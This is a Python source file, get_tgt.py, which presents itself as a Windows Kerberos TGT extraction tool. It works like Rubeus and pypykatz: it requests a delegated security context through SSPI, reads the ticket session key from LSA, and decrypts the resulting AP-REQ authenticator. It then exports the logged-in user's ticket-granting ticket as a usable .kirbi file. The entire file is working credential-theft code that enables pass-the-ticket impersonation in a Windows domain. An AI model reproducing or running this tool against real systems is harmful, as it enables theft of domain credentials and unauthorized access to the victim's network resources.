"""
get_tgt.py - Windows Kerberos TGT Extraction Tool

Extracts the currently logged-in Windows user's Kerberos TGT using SSPI/LSA APIs.
Implements security context delegation (matching tools like Rubeus and pypykatz).

Workflow:
  1. Acquire Credentials Handle via SSPI (secur32.dll).
  2. Initialize Security Context with ISC_REQ_DELEGATE flag to target SPN.
  3. Query LSA for the Session Key associated with the target ticket.
  4. Decrypt the GSS-API AP-REQ Authenticator token returned by SSPI.
  5. Extract and parse the delegated TGT payload into a usable .kirbi (KRB_CRED) bytes object.

Dependencies:
  pip install minikerberos asn1crypto
"""

from __future__ import annotations

import argparse
import ctypes
from ctypes import (
    POINTER,
    Structure,
    addressof,
    byref,
    cast,
    create_string_buffer,
    pointer,
    string_at,
)
import ctypes.wintypes
from contextlib import contextmanager
import os
import sys
from typing import Any, Dict, Generator, Tuple

# Third-party ASN.1 and Kerberos dependencies
from asn1crypto import core
from minikerberos.protocol.asn1_structs import AP_REQ, KRB_CRED, Authenticator, EncryptedData
from minikerberos.protocol.encryption import Key, _enctype_table
from minikerberos.protocol.structures import AuthenticatorChecksum

# ============================================================
#  Type Aliases & Architecture Constants (Best Practice)
# ============================================================
# Explicitly scope primitives through ctypes to prevent namespace pollution
PVOID = ctypes.c_void_p
PPVOID = POINTER(PVOID)
PHANDLE = POINTER(ctypes.wintypes.HANDLE)
NTSTATUS = ctypes.c_long

# Guaranteed pointer-width types for 32-bit and 64-bit architectures
ULONG_PTR = ctypes.c_uint64 if ctypes.sizeof(PVOID) == 8 else ctypes.c_uint32
LARGE_INTEGER = ctypes.c_longlong

# SSPI & LSA Constants
SEC_E_OK = 0x00000000
SEC_E_CONTINUE_NEEDED = 0x00090312
SECPKG_CRED_OUTBOUND = 2

ISC_REQ_DELEGATE = 0x00000001
ISC_REQ_MUTUAL_AUTH = 0x00000002
ISC_REQ_ALLOCATE_MEMORY = 0x00000100
KerbRetrieveEncodedTicketMessage = 8

# Bind Windows Security DLL
secur32 = ctypes.windll.Secur32  # type: ignore


# ============================================================
#  Win32 C-Structures
# ============================================================

class LUID(Structure):
    """Locally Unique Identifier (LUID) representation."""
    _fields_ = [("LowPart", ctypes.wintypes.DWORD), ("HighPart", ctypes.c_long)]

    def to_int(self) -> int:
        return (self.HighPart << 32) + self.LowPart

    @classmethod
    def from_int(cls, value: int) -> LUID:
        luid = cls()
        luid.HighPart = (value >> 32) & 0xFFFFFFFF
        luid.LowPart = value & 0xFFFFFFFF
        return luid


class LSA_STRING(Structure):
    """LSA ANSI string container."""
    _fields_ = [
        ("Length", ctypes.c_short),
        ("MaximumLength", ctypes.c_short),
        ("Buffer", POINTER(ctypes.c_char)),
    ]


class LSA_UNICODE_STRING(Structure):
    """LSA UTF-16 Unicode string container."""
    _fields_ = [
        ("Length", ctypes.c_short),
        ("MaximumLength", ctypes.c_short),
        ("Buffer", POINTER(ctypes.wintypes.WCHAR)),
    ]


class KERB_CRYPTO_KEY(Structure):
    """Kerberos Encryption Key descriptor."""
    _fields_ = [
        ("KeyType", ctypes.c_long),
        ("Length", ctypes.wintypes.DWORD),
        ("Value", PVOID),
    ]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "KeyType": self.KeyType,
            "Key": string_at(self.Value, self.Length),
        }


class KERB_EXTERNAL_TICKET(Structure):
    """Structure returned by LSA during ticket retrieval."""
    _fields_ = [
        ("ServiceName", PVOID),
        ("TargetName", PVOID),
        ("ClientName", PVOID),
        ("DomainName", LSA_UNICODE_STRING),
        ("TargetDomainName", LSA_UNICODE_STRING),
        ("AltTargetDomainName", LSA_UNICODE_STRING),
        ("SessionKey", KERB_CRYPTO_KEY),
        ("TicketFlags", ctypes.wintypes.DWORD),
        ("Flags", ctypes.wintypes.DWORD),
        ("KeyExpirationTime", LARGE_INTEGER),
        ("StartTime", LARGE_INTEGER),
        ("EndTime", LARGE_INTEGER),
        ("RenewUntil", LARGE_INTEGER),
        ("TimeSkew", LARGE_INTEGER),
        ("EncodedTicketSize", ctypes.wintypes.DWORD),
        ("EncodedTicket", PVOID),
    ]

    def get_data(self) -> Dict[str, Any]:
        return {
            "Key": self.SessionKey.to_dict(),
            "Ticket": string_at(self.EncodedTicket, self.EncodedTicketSize),
        }


class KERB_RETRIEVE_TKT_RESPONSE(Structure):
    """LSA query response wrapper."""
    _fields_ = [("Ticket", KERB_EXTERNAL_TICKET)]


class SecHandle(Structure):
    """SSPI Security Handle (CredHandle / CtxtHandle)."""
    _fields_ = [("dwLower", ULONG_PTR), ("dwUpper", ULONG_PTR)]


CredHandle = SecHandle
CtxtHandle = SecHandle


class TimeStamp(Structure):
    """Win32 FILETIME representation."""
    _fields_ = [
        ("dwLowDateTime", ctypes.wintypes.DWORD),
        ("dwHighDateTime", ctypes.wintypes.DWORD),
    ]


class SecBuffer(Structure):
    """SSPI Security Buffer descriptor."""
    _fields_ = [
        ("cbBuffer", ctypes.wintypes.DWORD),
        ("BufferType", ctypes.wintypes.DWORD),
        ("pvBuffer", PVOID),
    ]


class SecBufferDesc(Structure):
    """SSPI Security Buffer Array container."""
    _fields_ = [
        ("ulVersion", ctypes.wintypes.DWORD),
        ("cBuffers", ctypes.wintypes.DWORD),
        ("pBuffers", POINTER(SecBuffer)),
    ]


# ============================================================
#  API Error Checking Routines
# ============================================================

def _check_ntstatus(result: int, func: Any, args: Tuple[Any, ...]) -> int:
    """Error check callback for Win32 NTSTATUS functions."""
    if result != 0:
        raise ctypes.WinError(result)
    return result


def _check_sspi(result: int, func: Any, args: Tuple[Any, ...]) -> int:
    """Error check callback for SSPI functions."""
    if result in (SEC_E_OK, SEC_E_CONTINUE_NEEDED):
        return result
    raise ctypes.WinError(result)


# Setup Win32 Function Signatures (Prevents 64-bit integer conversion overflow errors)
if hasattr(secur32, "FreeContextBuffer"):
    secur32.FreeContextBuffer.argtypes = [PVOID]
    secur32.FreeContextBuffer.restype = NTSTATUS


# ============================================================
#  Resource Management & LSA Helpers
# ============================================================

@contextmanager
def get_lsa_handle() -> Generator[ctypes.wintypes.HANDLE, None, None]:
    """
    RAII context manager for managing LSA Connection lifetime safely.
    Guarantees LsaDeregisterLogonProcess is called even during runtime exceptions.
    """
    lsa_connect = secur32.LsaConnectUntrusted
    lsa_connect.argtypes = [PHANDLE]
    lsa_connect.restype = NTSTATUS
    lsa_connect.errcheck = _check_ntstatus

    lsa_close = secur32.LsaDeregisterLogonProcess
    lsa_close.argtypes = [ctypes.wintypes.HANDLE]
    lsa_close.restype = NTSTATUS

    handle = ctypes.wintypes.HANDLE()
    lsa_connect(byref(handle))
    try:
        yield handle
    finally:
        lsa_close(handle)


def lsa_lookup_authentication_package(lsa_handle: ctypes.wintypes.HANDLE, package_name: str) -> int:
    """Resolves the LSA Authentication Package ID (e.g., 'kerberos')."""
    f = secur32.LsaLookupAuthenticationPackage
    f.argtypes = [ctypes.wintypes.HANDLE, POINTER(LSA_STRING), POINTER(ctypes.wintypes.DWORD)]
    f.restype = NTSTATUS
    f.errcheck = _check_ntstatus

    encoded_pkg = package_name.encode("ascii")
    lsa_str = LSA_STRING()
    buf = create_string_buffer(encoded_pkg)
    lsa_str.Buffer = cast(buf, POINTER(ctypes.c_char))
    lsa_str.Length = len(encoded_pkg)
    lsa_str.MaximumLength = len(encoded_pkg) + 1

    pkg_id = ctypes.wintypes.DWORD(0)
    f(lsa_handle, byref(lsa_str), byref(pkg_id))
    return pkg_id.value


def lsa_call_authentication_package(
        lsa_handle: ctypes.wintypes.HANDLE, pkg_id: int, request_buffer: bytes
) -> Tuple[bytes, PVOID]:
    """Issues an authentication package message to LSA."""
    f = secur32.LsaCallAuthenticationPackage
    f.argtypes = [
        ctypes.wintypes.HANDLE,
        ctypes.wintypes.DWORD,
        PVOID,
        ctypes.wintypes.DWORD,
        PPVOID,
        POINTER(ctypes.wintypes.DWORD),
        POINTER(NTSTATUS),
    ]
    f.restype = NTSTATUS
    f.errcheck = _check_ntstatus

    response_ptr = PVOID()
    response_len = ctypes.wintypes.DWORD(0)
    protocol_status = NTSTATUS(0)

    f(
        lsa_handle,
        pkg_id,
        request_buffer,
        len(request_buffer),
        byref(response_ptr),
        byref(response_len),
        byref(protocol_status),
    )

    if protocol_status.value != 0:
        raise ctypes.WinError(protocol_status.value)

    data = string_at(response_ptr, response_len.value) if response_len.value > 0 else b""
    return data, response_ptr


def acquire_credentials_handle(package_name: str, usage_flags: int) -> CredHandle:
    """Acquires a handle to pre-existing credentials via SSPI."""
    f = secur32.AcquireCredentialsHandleA
    f.argtypes = [
        POINTER(ctypes.c_char),
        POINTER(ctypes.c_char),
        ctypes.wintypes.DWORD,
        PVOID,
        PVOID,
        PVOID,
        PVOID,
        POINTER(CredHandle),
        POINTER(TimeStamp),
    ]
    f.restype = ctypes.c_ulong
    f.errcheck = _check_sspi

    cred_handle = CredHandle()
    pts = TimeStamp()
    pkg_buf = create_string_buffer(package_name.encode("ascii"))

    f(None, pkg_buf, usage_flags, None, None, None, None, byref(cred_handle), byref(pts))
    return cred_handle


def initialize_security_context(
        creds: CredHandle, target_spn: str, flags: int
) -> Tuple[int, bytes]:
    """Initiates the client-side security context generation."""
    f = secur32.InitializeSecurityContextA
    f.argtypes = [
        POINTER(CredHandle),
        POINTER(CtxtHandle),
        POINTER(ctypes.c_char),
        ctypes.wintypes.DWORD,
        ctypes.wintypes.DWORD,
        ctypes.wintypes.DWORD,
        POINTER(SecBufferDesc),
        ctypes.wintypes.DWORD,
        POINTER(CtxtHandle),
        POINTER(SecBufferDesc),
        POINTER(ctypes.wintypes.DWORD),
        POINTER(TimeStamp),
    ]
    f.restype = ctypes.c_ulong
    f.errcheck = _check_sspi

    target_buf = create_string_buffer(target_spn.encode("ascii"))
    out_sec_buf = SecBuffer()
    out_sec_buf.cbBuffer = 0
    out_sec_buf.BufferType = 2  # SECBUFFER_TOKEN
    out_sec_buf.pvBuffer = None

    out_desc = SecBufferDesc()
    out_desc.ulVersion = 0
    out_desc.cBuffers = 1
    out_desc.pBuffers = pointer(out_sec_buf)

    context_handle = CtxtHandle()
    out_flags = ctypes.wintypes.DWORD()
    expiry = TimeStamp()

    status = f(
        byref(creds),
        None,
        target_buf,
        flags,
        0,
        0,
        None,
        0,
        byref(context_handle),
        byref(out_desc),
        byref(out_flags),
        byref(expiry),
    )

    # Copy output buffer bytes safely
    token_data = string_at(out_sec_buf.pvBuffer, out_sec_buf.cbBuffer)

    # Explicitly free memory allocated by Windows SSPI allocator
    if out_sec_buf.pvBuffer:
        secur32.FreeContextBuffer(out_sec_buf.pvBuffer)

    return status, token_data


# ============================================================
#  Request Serialization & ASN.1 Decryption
# ============================================================

def build_retrieve_ticket_request(target_spn: str, luid_val: int = 0) -> bytes:
    """
    Constructs a contiguous memory block for KERB_RETRIEVE_TKT_REQUEST without
    triggering integer overflow during 64-bit pointer calculations.
    """
    target_encoded = target_spn.encode("utf-16-le") + b"\x00\x00"

    class _KERB_RETRIEVE_TKT_REQUEST(Structure):
        _pack_ = 8  # Enforce 64-bit C-runtime struct alignment
        _fields_ = [
            ("MessageType", ctypes.wintypes.DWORD),
            ("LogonId", LUID),
            ("TargetName", LSA_UNICODE_STRING),
            ("TicketFlags", ctypes.wintypes.DWORD),
            ("CacheOptions", ctypes.wintypes.DWORD),
            ("EncryptionType", ctypes.c_long),
            ("CredentialsHandle", SecHandle),
        ]

    header_size = ctypes.sizeof(_KERB_RETRIEVE_TKT_REQUEST)
    total_size = header_size + len(target_encoded)

    # Allocate a single contiguous C byte buffer
    buf = create_string_buffer(total_size)
    buf_address = addressof(buf)

    # Overlaid struct instance
    req = _KERB_RETRIEVE_TKT_REQUEST.from_buffer(buf)
    req.MessageType = KerbRetrieveEncodedTicketMessage
    req.LogonId = LUID.from_int(luid_val)
    req.CacheOptions = 8  # KERB_RETRIEVE_TICKET_USE_CACHE_ONLY

    # Move target string to buffer end
    ctypes.memmove(buf_address + header_size, target_encoded, len(target_encoded))

    # Set unicode string buffer address explicitly using PVOID to avoid 64-bit integer overflow
    string_address = buf_address + header_size
    req.TargetName.Length = len(target_encoded) - 2
    req.TargetName.MaximumLength = len(target_encoded)
    req.TargetName.Buffer = cast(PVOID(string_address), POINTER(ctypes.wintypes.WCHAR))

    return bytes(buf)


def extract_ticket_from_lsa(
        lsa_handle: ctypes.wintypes.HANDLE, pkg_id: int, target_spn: str
) -> Dict[str, Any]:
    """Queries LSA to extract the Session Key and raw Ticket payload for an SPN."""
    req_bytes = build_retrieve_ticket_request(target_spn)
    resp_bytes, free_ptr = lsa_call_authentication_package(lsa_handle, pkg_id, req_bytes)

    try:
        resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(resp_bytes)
        ticket_payload = resp.Ticket.get_data()
    finally:
        if free_ptr:
            secur32.LsaFreeReturnBuffer(free_ptr)

    return ticket_payload


class MechType(core.ObjectIdentifier):
    _map = {"1.2.840.113554.1.2.2": "KRB5 - Kerberos 5"}


class InitialContextToken(core.Sequence):
    """GSS-API InitialContextToken parser (RFC 2743)."""
    class_ = 1
    tag = 0
    _fields = [
        ("thisMech", MechType, {"optional": False}),
        ("innerContextToken", core.Any, {"optional": False}),
    ]
    _oid_pair = ("thisMech", "innerContextToken")
    _oid_specs = {"KRB5 - Kerberos 5": AP_REQ}


# ============================================================
#  Main Execution Logic
# ============================================================

def get_tgt(target_spn: str | None = None) -> bytes:
    """
    Extracts the current user's TGT as a raw KRB_CRED (.kirbi) binary blob.

    :param target_spn: SPN to request context for. Defaults to cifs/<LOGONSERVER>.
    :return: Raw KRB_CRED bytes.
    """
    if target_spn is None:
        logon_server = os.environ.get("LOGONSERVER", "").lstrip("\\")
        if not logon_server:
            raise RuntimeError("No target specified and LOGONSERVER environment variable is empty.")
        target_spn = f"cifs/{logon_server}"

    # Step 1: Query Authentication Package ID
    with get_lsa_handle() as lsa_handle:
        pkg_id = lsa_lookup_authentication_package(lsa_handle, "kerberos")

    # Step 2: Issue SSPI delegation request to generate AP-REQ containing TGT delegation structure
    creds = acquire_credentials_handle("kerberos", SECPKG_CRED_OUTBOUND)
    sspi_flags = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY
    _, raw_token = initialize_security_context(creds, target_spn, sspi_flags)

    # Step 3: Extract Session Key from LSA
    with get_lsa_handle() as lsa_handle:
        ticket_data = extract_ticket_from_lsa(lsa_handle, pkg_id, target_spn)

    session_key = Key(ticket_data["Key"]["KeyType"], ticket_data["Key"]["Key"])

    # Step 4: Parse AP-REQ inside the GSS-API InitialContextToken container
    ict = InitialContextToken.load(raw_token)
    apreq = AP_REQ(ict.native["innerContextToken"]).native

    # Step 5: Decrypt Authenticator structure using the Session Key
    etype = apreq["authenticator"]["etype"]
    cipher = _enctype_table[etype]
    decrypted_auth = cipher.decrypt(session_key, 11, apreq["authenticator"]["cipher"])
    authenticator = Authenticator.load(decrypted_auth).native

    # Step 6: Validate Checksum and extract delegated KRB_CRED
    cksum = authenticator["cksum"]
    if cksum["cksumtype"] != 0x8003:
        raise ValueError(f"Unexpected Checksum type: {cksum['cksumtype']:#x}")

    checksum_data = AuthenticatorChecksum.from_bytes(cksum["checksum"])
    if "GSS_C_DELEG_FLAG" not in checksum_data.flags:
        raise RuntimeError("GSS_C_DELEG_FLAG not present in checksum. No delegated TGT returned by system.")

    # Step 7: Decrypt the EncryptedData portion of KRB_CRED payload
    cred_orig = KRB_CRED.load(checksum_data.delegation_data).native
    decrypted_cred = cipher.decrypt(session_key, 14, cred_orig["enc-part"]["cipher"])

    # Reconstruct KRB_CRED structure with decrypted payload
    cred_orig["enc-part"] = EncryptedData({"etype": 0, "cipher": decrypted_cred})
    return KRB_CRED(cred_orig).dump()


def main() -> None:
    """Command Line Interface Entrypoint."""
    parser = argparse.ArgumentParser(description="Extract Windows User Kerberos TGT")
    parser.add_argument("--target", help="Target SPN (Default: cifs/<LOGONSERVER>)")
    parser.add_argument("-o", "--out-file", help="Destination path for output .kirbi file")
    args = parser.parse_args()

    try:
        kirbi_bytes = get_tgt(args.target)
        if args.out_file:
            with open(args.out_file, "wb") as f:
                f.write(kirbi_bytes)
            print(f"[+] TGT exported successfully to: {args.out_file}")
        else:
            print(f"[+] TGT Extracted successfully ({len(kirbi_bytes)} bytes).")
    except Exception as exc:
        print(f"[-] Failed to extract TGT: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()